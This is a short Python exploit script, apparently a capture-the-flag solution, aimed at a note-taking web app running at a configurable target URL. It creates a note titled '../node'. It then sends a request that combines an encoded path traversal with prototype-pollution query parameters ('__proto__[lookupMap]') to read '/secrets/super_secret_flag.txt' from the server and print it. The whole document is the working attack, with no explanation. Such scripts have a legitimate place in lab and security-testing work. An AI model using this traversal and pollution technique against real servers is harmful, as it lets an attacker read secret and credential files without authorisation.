import os
import requests

TARGET = os.environ.get("TARGET", "http://localhost:3000")

r = requests.post(f"{TARGET}/notes", json={"title": "../node", "content": "test"})

r = requests.get(f"{TARGET}/note/..%2fnode", params={
    "__proto__[lookupCompressed]": "true",
    "__proto__[lookupMap][identity]": "-compile-cache/../../../../../secrets/super_secret_flag.txt"   
}, headers={
    "Accept-Encoding": "identity",
})

print(r.text)
